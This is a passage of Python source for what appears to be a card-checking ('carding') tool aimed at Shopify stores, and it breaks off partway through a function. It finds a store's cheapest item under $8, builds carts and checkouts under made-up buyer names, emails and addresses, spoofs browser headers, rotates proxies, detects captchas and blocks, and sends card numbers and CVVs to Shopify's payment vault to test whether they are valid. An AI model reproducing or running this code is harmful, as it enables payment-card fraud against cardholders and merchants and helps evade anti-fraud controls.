    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()

    def _pick(entries):
        return random.choice(entries) if isinstance(entries, list) else entries

    if tcn in book:
        return _pick(book[tcn])

    ccn = C2C.get(cc)

    if rc in book and ccn == rc:
        return _pick(book[rc])
    elif rc in book:
        return _pick(book[rc])
    return _pick(book["DEFAULT"])

def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception:
        return None

class Utils:
    @staticmethod
    def get_random_name():
        first_names = [
            # Male
            "James", "John", "Robert", "Michael", "William", "David", "Richard",
            "Joseph", "Thomas", "Charles", "Christopher", "Daniel", "Matthew",
            "Anthony", "Mark", "Donald", "Steven", "Paul", "Andrew", "Kenneth",
            "Joshua", "Kevin", "Brian", "George", "Timothy", "Ronald", "Edward",
            "Jason", "Jeffrey", "Ryan", "Jacob", "Gary", "Nicholas", "Eric",
            "Jonathan", "Stephen", "Larry", "Justin", "Scott", "Brandon",
            # Female
            "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Susan", "Jessica",
            "Sarah", "Karen", "Lisa", "Nancy", "Betty", "Margaret", "Sandra",
            "Ashley", "Dorothy", "Kimberly", "Emily", "Donna", "Michelle", "Carol",
            "Amanda", "Melissa", "Deborah", "Stephanie", "Rebecca", "Sharon",
            "Laura", "Cynthia", "Kathleen", "Amy", "Angela", "Shirley", "Anna",
            "Brenda", "Pamela", "Emma", "Nicole", "Helen", "Samantha", "Katherine",
            "Christine", "Debra", "Rachel", "Carolyn", "Janet", "Catherine", "Maria",
        ]
        last_names = [
            "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
            "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez",
            "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin",
            "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark",
            "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King",
            "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green",
            "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell",
            "Carter", "Roberts", "Turner", "Phillips", "Evans", "Collins", "Stewart",
            "Morris", "Murphy", "Cook", "Rogers", "Gutierrez", "Ortiz", "Morgan",
            "Cooper", "Peterson", "Bailey", "Reed", "Kelly", "Howard", "Ramos",
            "Kim", "Cox", "Ward", "Richardson", "Watson", "Brooks", "Chavez",
            "Wood", "James", "Bennett", "Gray", "Mendoza", "Ruiz", "Hughes",
            "Price", "Butler", "Foster", "Bryant", "Alexander", "Russell", "Griffin",
            "Diaz", "Hayes", "Myers", "Ford", "Hamilton", "Graham", "Sullivan",
        ]
        return (random.choice(first_names), random.choice(last_names))

    @staticmethod
    def generate_email(first, last):
        domains = [
            "gmail.com", "yahoo.com", "outlook.com", "hotmail.com",
            "icloud.com", "me.com", "mac.com",
            "protonmail.com", "pm.me",
            "aol.com", "live.com", "msn.com",
        ]
        n = random.randint(1, 999)
        variants = [
            f"{first.lower()}.{last.lower()}",
            f"{first.lower()}{last.lower()}",
            f"{first.lower()}{last.lower()}{n}",
            f"{first.lower()}{random.randint(10,99)}.{last.lower()}",
            f"{first[0].lower()}{last.lower()}",
            f"{first[0].lower()}{last.lower()}{n}",
            f"{first.lower()}_{last.lower()}",
            f"{last.lower()}.{first.lower()}",
        ]
        return f"{random.choice(variants)}@{random.choice(domains)}"

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    
    parts = proxy_str.split(':')
    
    if len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    elif len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    else:
        return None

def is_captcha_required(response_text):
    if not response_text:
        return False
    
    indicators = [
        'CAPTCHA_REQUIRED',
        '"code":"CAPTCHA_REQUIRED"',
        "'code':'CAPTCHA_REQUIRED'",
        '"message":"CAPTCHA_REQUIRED"',
        'captcha required',
        'CAPTCHA CHALLENGE',
        'hcaptcha',
        'h-captcha'
    ]
    
    text_upper = response_text.upper()
    for indicator in indicators:
        if indicator.upper() in text_upper:
            return True
    return False

async def make_graphql_request_with_captcha_handling(
    session, graphql_url, params, headers, json_data,
    checkout_url, max_retries=1, solve_captcha=True, proxy=None
):
    original_variables = json_data.get('variables', {}).copy()
    response = None
    response_text = ""

    for attempt in range(max_retries + 1):
        try:
            async with session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy) as response:
                response_text = await response.text()
                _status = response.status

            # Explicitly handle rate-limit / block status codes
            if _status in (429, 503, 402):
                if attempt < max_retries:
                    await asyncio.sleep(2)
                    continue
                return True, f"HTTP {_status}: Rate limited or blocked by site", False

            if _status == 403:
                return True, "HTTP 403: IP blocked by site", False

            return True, response_text, False

        except Exception as e:
            if attempt == max_retries:
                return None, str(e), False
            await asyncio.sleep(1)

    return None, response_text, False

def _build_proxy_url(proxy_str):
    """Convert stored proxy formats to a full http:// URL for curl_cffi."""
    if not proxy_str:
        return None
    s = proxy_str.strip()
    if s.startswith("http://") or s.startswith("https://") or s.startswith("socks"):
        return s
    parts = s.split(':')
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif '@' in s:
        return f"http://{s}"
    return None

def _sync_fetch_products(domain, proxy_url):
    """Sync curl_cffi fetch — runs in executor so it never blocks the event loop.
    Sync curl respects timeout; async curl_cffi does NOT (hangs indefinitely on bad proxies).
    """
    try:
        with _curl_req.Session(impersonate="chrome120", verify=False) as sess:
            r = sess.get(f"{domain}/products.json?limit=250",
                         proxy=proxy_url, timeout=20)
            if r.status_code == 401:
                return False, "Site requires login (401)"
            if r.status_code == 402:
                return False, "Site requires payment/password (402)"
            if r.status_code == 403:
                return False, "Access denied (403)"
            if r.status_code == 429:
                return False, "RATE_LIMITED_429"
            if r.status_code != 200:
                return False, f"Site error (HTTP {r.status_code})"
            text = r.text
            if "shopify" not in text.lower():
                return False, "Not a Shopify site"
            try:
                result = r.json().get('products', [])
            except Exception:
                return False, "Invalid JSON from site"
            if not result:
                return False, "No products found"

            # Paginate to find truly cheapest item across all pages
            page = 2
            while len(result) % 250 == 0 and page <= 10:
                try:
                    rp = sess.get(f"{domain}/products.json?limit=250&page={page}",
                                  proxy=proxy_url, timeout=20)
                    if rp.status_code != 200:
                        break
                    page_data = rp.json().get('products', [])
                    if not page_data:
                        break
                    result += page_data
                    if len(page_data) < 250:
                        break
                    page += 1
                except Exception:
                    break

            return result
    except Exception as e:
        return False, str(e) or type(e).__name__

async def fetch_products(domain, proxy_str=None, physical_only=False):
    """Fetch cheapest valid product variant from a Shopify store.
    Uses sync curl_cffi in run_in_executor — the ONLY approach that correctly
    enforces timeouts on proxied connections (async curl ignores timeout on bad proxies).
    """
    if not domain.startswith('http'):
        domain = "https://" + domain

    proxy_url = _build_proxy_url(proxy_str)
    loop = asyncio.get_event_loop()

    # Use proxy only — no direct fallback
    if proxy_url:
        try:
            raw = await asyncio.wait_for(
                loop.run_in_executor(None, _sync_fetch_products, domain, proxy_url),
                timeout=22
            )
        except asyncio.TimeoutError:
            return False, "Proxy timed out"
        except Exception as e:
            return False, f"Site error: {str(e)[:80]}"
    else:
        # No proxy provided — run direct
        try:
            raw = await asyncio.wait_for(
                loop.run_in_executor(None, _sync_fetch_products, domain, None),
                timeout=22
            )
        except asyncio.TimeoutError:
            return False, "Site unreachable (timeout)"
        except Exception as e:
            return False, f"Site error: {str(e)[:80]}"

    if isinstance(raw, tuple):
        return False, f"Site error: {str(raw[1])[:80]}"

    result = raw

    # Product types / handles that cannot be checked out via normal cart flow
    _SKIP_TYPES = {'gift card', 'gift cards', 'gift_card', 'gift_cards', 'e-gift card',
                   'egift card', 'donation', 'e-gift', 'egift'}
    _SKIP_HANDLES = ('gift-card', 'giftcard', 'gift_card', 'e-gift', 'egift', 'donation')

    def _is_uncheckable(product):
        ptype = (product.get('product_type') or '').lower().strip()
        handle = (product.get('handle') or '').lower()
        if ptype in _SKIP_TYPES:
            return True
        if any(k in handle for k in _SKIP_HANDLES):
            return True
        return False

    def _scan_products(products, skip_unavailable, physical_only=False):
        best_price = float('inf')
        best_ships = True
        best = None
        for product in products:
            if not product.get('variants'):
                continue
            if _is_uncheckable(product):
                continue
            for variant in product['variants']:
                if skip_unavailable and variant.get('available') is False:
                    continue
                if variant.get('requires_selling_plan'):
                    continue
                try:
                    price = variant.get('price', '0')
                    price = float(price.replace(',', '')) if isinstance(price, str) else float(price)
                    if price <= 0 or price > 8.0:
                        continue
                    ships = variant.get('requires_shipping') is not False
                    if physical_only and not ships:
                        continue
                    # Prefer lower price; on equal price prefer digital (ship=False) — no shipping added at checkout
                    if price < best_price or (price == best_price and not ships and best_ships):
                        best_price = price
                        best_ships = ships
                        best = {
                            'site': domain,
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'link': f"{domain}/products/{product['handle']}",
                            'requires_shipping': ships
                        }
                except (ValueError, TypeError, AttributeError):
                    continue
        return best

    # Pass 1: available variants only; Pass 2: ignore availability flag
    min_product = _scan_products(result, skip_unavailable=True, physical_only=physical_only)
    if not min_product:
        min_product = _scan_products(result, skip_unavailable=False, physical_only=physical_only)

    if isinstance(min_product, dict) and min_product.get('variant_id'):
        return min_product
    # All products on this site are priced over $8 — signal caller to rotate
    return False, "PRICE_TOO_HIGH"

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    
    message = str(message)
    
    patterns = [
        r'(PAYMENTS_[A-Z_]+)',
        r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'"
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                match = match.strip("{}:'\" ")
                return match
    
    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            return first_word
    
    return message[:50]

def find_between(text, start, end):
    try:
        return text.split(start, 1)[1].split(end, 1)[0]
    except:
        return None

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, _tried_digital=False):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    
    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    displayName = ""
    payment_identifier = None
    proxy = _build_proxy_url(proxy_str) if proxy_str else None
    checkpoint_data = None
    running_total = "0.00"

    try:
        _ua, _ch_ua, _ch_mobile, _ch_platform = pick_ua_profile()
        _accept_lang = random.choice([
            'en-US,en;q=0.9',
            'en-GB,en;q=0.9,en-US;q=0.8',
            'en-US,en;q=0.8,en-GB;q=0.6',
        ])
        headers = {
            'User-Agent': _ua,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': _accept_lang,
            'Content-Type': 'application/json',
            'Origin': ourl,
            'Referer': ourl,
        }
        if _ch_ua:
            headers['sec-ch-ua']          = _ch_ua
            headers['sec-ch-ua-mobile']   = _ch_mobile
            headers['sec-ch-ua-platform'] = _ch_platform

        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]
        
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)
        
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]
        address2 = ""

        _requires_shipping = True
        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple) and info[0] is False:
                return False, info[1], gateway, total_price, currency
            variant_id = info['variant_id']
            _requires_shipping = info.get('requires_shipping', True)

        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            url = ourl
            cart = url + '/cart/add.js'
            checkout = url + '/checkout/'

            cart_headers = {
                **headers,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json, text/javascript'
            }
            async with session.post(cart, data=f'id={variant_id}&quantity=1', headers=cart_headers, proxy=proxy) as cart_resp:
                _cart_ok = cart_resp.status == 200
                _cart_status = cart_resp.status

            if not _cart_ok:
                cart_headers_alt = {
                    **headers,
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                }
                cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                async with session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy) as cart_resp2:
                    _cart_ok = cart_resp2.status == 200
                    _cart_status = cart_resp2.status

            if not _cart_ok:
                return False, f"Cart failed with status {_cart_status}", gateway, total_price, currency

            checkout_headers = {
                **headers,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1'
            }
            response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
            checkout_url = str(response.url)

            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

            sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
            
            text = await response.text()
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                if not sst:
                    sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
                if not sst:
                    sst = extract_between(text, '"serializedSessionToken":"', '"')
                if not sst:
                    sst = extract_between(text, 'data-session-token="', '"')
                if not sst:
                    sst = extract_between(text, '"sessionToken":"', '"')
            
            if 'login' in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency

            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
            transformer_fingerprint_v2 = None
            stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
            
            merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                    extract_between(text, 'ProductVariantMerchandise/', '&q') or \
                    extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
            if not merch:
                merch = str(variant_id)
            
            currency = 'USD'
            if 'currencyCode&quot;:&quot;' in text:
                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or 'USD'

            # Switch to the store's local country address based on detected currency.
            # This ensures NZD stores get NZ addresses, AUD stores get AU, etc.
            _ccy_key = C2C.get(currency.upper())
            if _ccy_key and _ccy_key in book and _ccy_key != country_code:
                _loc = random.choice(book[_ccy_key]) if isinstance(book[_ccy_key], list) else book[_ccy_key]
                country_code = _loc["countryCode"]
                phone        = _loc["phone"]
                street       = _loc["address1"]
                city         = _loc["city"]
                state        = _loc["zoneCode"]
                s_zip        = _loc["postalCode"]
            
            subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
                     extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else "0.01"

            # Extract build ID (commitSha), source token, and identification signature
            unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
            
            build_id = None
            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped_text)
            if build_match:
                build_id = build_match.group(1)
            
            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace('&quot;', '').strip('"')
            
            ident_sig = None

            ident_sig = extract_between(
    text,
    'checkoutCardsinkCallerIdentificationSignature&quot;:&quot;',
    '&quot;'
)
            
            if not sst:
                return False, "Failed to get session token", gateway, total_price, currency
            
            # Add checkout-specific headers for modern Shopify (matching working Go implementation)
            headers.update({
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
                'x-checkout-one-session-token': sst,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            })
            if build_id:
                headers['x-checkout-web-build-id'] = build_id
                headers['x-checkout-web-deploy-stage'] = 'production'
                headers['x-checkout-web-server-handling'] = 'fast'                
                headers['x-checkout-web-server-rendering'] = 'yes'
            if source_token:
                headers['x-checkout-web-source-id'] = source_token

            params = {'operationName': 'Proposal'}
            
            json_data = {
                'query': QUERY_PROPOSAL_SHIPPING,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [] if not _requires_shipping else [{
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone
                                }
                            },
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {'any': True},
                                    'shipments': {'any': True}
                                },
                                'options': {}
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'any': True},
                            'destinationChanged': True
                        }],
                        'noDeliveryRequired': [{'stableId': stableId or '1'}] if not _requires_shipping else [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True
                    },
                    'deliveryExpectations': {'deliveryExpectationLines': []},
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': '', 'city': '', 'countryCode': country_code,
                                'lastName': '', 'zoneCode': state, 'phone': ''
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'countryCode': country_code},
                        'rememberMe': False
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'optionalDuties': {'buyerRefusesDuties': False},
                    'transformerFingerprintV2': transformer_fingerprint_v2
                },
                'operationName': 'Proposal'
            }

            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
            
            for i in range(2):
                response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
                )
                # Break as soon as we have a valid non-empty non-HTML JSON response
                if resp_text and resp_text.strip() and not resp_text.strip()[:15].lower().startswith(('<', '<!d')):
                    break
                if i == 0:
                    await asyncio.sleep(2)

            if not response:
                return False, f"Request failed: {resp_text}", gateway, total_price, currency

            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

            if not resp_text or not resp_text.strip():
                return False, "Empty response from site (Proposal step)", gateway, total_price, currency

            _rt_stripped = resp_text.strip()
            if _rt_stripped.lower().startswith(('<!doctype', '<html', '<?xml')):
                return False, "Site returned HTML block page (rate-limited or IP blocked)", gateway, total_price, currency

            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON response: {str(e)}", gateway, total_price, currency

            if 'errors' in resp_json:
                errors = resp_json.get('errors', [])
                error_msgs = [e.get('message', str(e)) for e in errors[:3]]
                return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency

            try:
                if 'data' not in resp_json:
                    return False, "No data in proposal response", gateway, total_price, currency
                
                session_data = resp_json['data'].get('session')
                if session_data is None:
                    return False, "Session is null", gateway, total_price, currency
                
                negotiate = session_data.get('negotiate')
                if negotiate is None:
                    return False, "Negotiate returned null", gateway, total_price, currency
                
                result = negotiate.get('result')
                if result is None:
                    return False, "Result is null", gateway, total_price, currency
                
                result_type = result.get('__typename', 'Unknown')
                
                if result_type == 'CheckpointDenied':
                    return False, f"Checkpoint Denied", gateway, total_price, currency
                
                if result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                
                if result_type == 'NegotiationResultFailed':
                    return False, "Negotiation failed", gateway, total_price, currency
                
                checkpoint_data = result.get('checkpointData')
                queueToken = result.get('queueToken') or queueToken

                seller_proposal = result.get('sellerProposal')
                if seller_proposal:
                    transformer_fingerprint_v2 = seller_proposal.get('transformerFingerprintV2') or transformer_fingerprint_v2
                    json_data['variables']['transformerFingerprintV2'] = transformer_fingerprint_v2
                if seller_proposal is None:
                    return False, "Seller proposal is null", gateway, total_price, currency
                
                delivery_data = seller_proposal.get('delivery')
                running_total_data = seller_proposal.get('runningTotal')
                
                if not running_total_data:
                    return False, "No runningTotal in sellerProposal", gateway, total_price, currency
                
                running_total = running_total_data['value']['amount']
                
            except (KeyError, TypeError) as e:
                return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency

            if not delivery_data:
                if not _requires_shipping:
                    delivery_strategy = ''
                    shipping_amount = 0.0
                else:
                    return False, "No delivery data in proposal", gateway, total_price, currency
            
            delivery_type = delivery_data.get('__typename', '')
            
            if delivery_type == 'PendingTerms':
                delivery_strategy = ''
                shipping_amount = 0.0
            elif delivery_type == 'FilledDeliveryTerms':
                delivery_lines = delivery_data.get('deliveryLines', [{}])
                if delivery_lines and len(delivery_lines) > 0:
                    available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if available_strategies and len(available_strategies) > 0:
                        delivery_strategy = available_strategies[0].get('handle', '')
                        shipping_amount_data = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                        try:
                            shipping_amount = float(shipping_amount_data)
                        except:
                            shipping_amount = 0.0
                    else:
                        delivery_strategy = ''
                        shipping_amount = 0.0
                else:
                    delivery_strategy = ''
                    shipping_amount = 0.0
            else:
                delivery_strategy = ''
                shipping_amount = 0.0
            
            try:
                tax_data = seller_proposal.get('tax', {})
                if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
                    tax_amount_data = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
                    tax_amount = float(tax_amount_data)
                else:
                    tax_amount = 0.0
            except:
                tax_amount = 0.0

            payment_data = seller_proposal.get('payment', {})
            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                payment_methods = payment_data.get('availablePaymentLines', [])
                for method in payment_methods:
                    payment_method = method.get('paymentMethod', {})
                    if payment_method.get('name') or payment_method.get('paymentMethodIdentifier'):
                        payment_identifier = payment_method.get('paymentMethodIdentifier')
                        displayName = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'Unknown')
                        
                        gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        
                        break
            
            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency
            
            json_data['query'] = QUERY_PROPOSAL_DELIVERY
            json_data['variables']['queueToken'] = queueToken or ''
            if not _requires_shipping:
                # Digital item: use deliveryMethodTypes NONE (matches SubmitForCompletion structure)
                json_data['variables']['delivery']['deliveryLines'] = [{
                    'selectedDeliveryStrategy': {
                        'deliveryStrategyMatchingConditions': {
                            'estimatedTimeInTransit': {'any': True},
                            'shipments': {'any': True}
                        },
                        'options': {}
                    },
                    'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]},
                    'deliveryMethodTypes': ['NONE'],
                    'expectedTotalPrice': {'any': True},
                    'destinationChanged': True
                }]
                json_data['variables']['delivery']['noDeliveryRequired'] = []
            elif json_data['variables']['delivery']['deliveryLines']:
                json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                    'deliveryStrategyByHandle': {
                        'handle': delivery_strategy if delivery_strategy else '',
                        'customDeliveryRate': False
                    },
                    'options': {}
                }
                json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                    'lines': [{'stableId': stableId or '1'}]
                }
                json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
                    'value': {'amount': str(shipping_amount), 'currencyCode': currency}
                }
                json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
            json_data['variables']['payment']['billingAddress'] = {
                'streetAddress': {
                    'address1': street, 'address2': address2, 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone
                }
            }
            json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone

            response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
            )
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency
            try:
                _d2 = json.loads(resp_text) if resp_text else {}
                _r2 = ((((_d2.get('data') or {}).get('session') or {}).get('negotiate') or {}).get('result') or {})
                queueToken = _r2.get('queueToken') or queueToken
                _sp2 = (_r2.get('sellerProposal') or {})
                transformer_fingerprint_v2 = _sp2.get('transformerFingerprintV2') or transformer_fingerprint_v2
            except Exception:
                pass

            payload = {
                "credit_card": {
                    "number": cc,
                    "month": int(mes),
                    "year": int(ano),
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None,
                    "issue_number": "",
                    "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(url).netloc
            }
            
            vault_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Accept-Language': _accept_lang,
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
                'User-Agent': _ua,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'active',
            }
            if _ch_ua:
                vault_headers['sec-ch-ua']          = _ch_ua
                vault_headers['sec-ch-ua-mobile']   = _ch_mobile
                vault_headers['sec-ch-ua-platform'] = _ch_platform
            if ident_sig:
                vault_headers['shopify-identification-signature'] = ident_sig
                vault_headers['x-checkout-cardsink-caller-identification-signature'] = ident_sig
            
            async with session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy) as response:
                _vault_status = response.status
                _vault_text = await response.text()
                try:
                    token_data = json.loads(_vault_text) if _vault_text.strip() else {}
                except Exception:
                    token_data = {}
                if _vault_status >= 400:
                    _verr = (token_data.get('error') or token_data.get('message') or
                             token_data.get('errors') or _vault_text.strip()[:120] or
                             f'VAULT_HTTP_{_vault_status}')
                    if isinstance(_verr, (dict, list)):
                        _verr = json.dumps(_verr)
                    return False, str(_verr)[:120], gateway, total_price, currency
                token = token_data.get('id')
                if not token:
                    return False, 'Unable to get payment token', gateway, total_price, currency

            params = {'operationName': 'SubmitForCompletion'}
            
            if not _requires_shipping:
                _submit_delivery = {
                    'deliveryLines': [{
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyMatchingConditions': {
                                'estimatedTimeInTransit': {'any': True},
                                'shipments': {'any': True}
                            },
                            'options': {}
                        },
                        'targetMerchandiseLines': {
                            'lines': [{'stableId': stableId or '1'}]
                        },
                        'deliveryMethodTypes': ['NONE'],
                        'expectedTotalPrice': {'any': True},
                        'destinationChanged': True
                    }],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': False,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True,
                }
            else:
                _submit_delivery = {
                    'deliveryLines': [{
                        'destination': {
                            'streetAddress': {
                                'address1': street, 'address2': address2, 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName,
                                'zoneCode': state, 'phone': phone
                            }
                        },
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyByHandle': {
                                'handle': delivery_strategy if delivery_strategy else '',
                                'customDeliveryRate': False
                            },
                            'options': {'phone': phone}
                        },
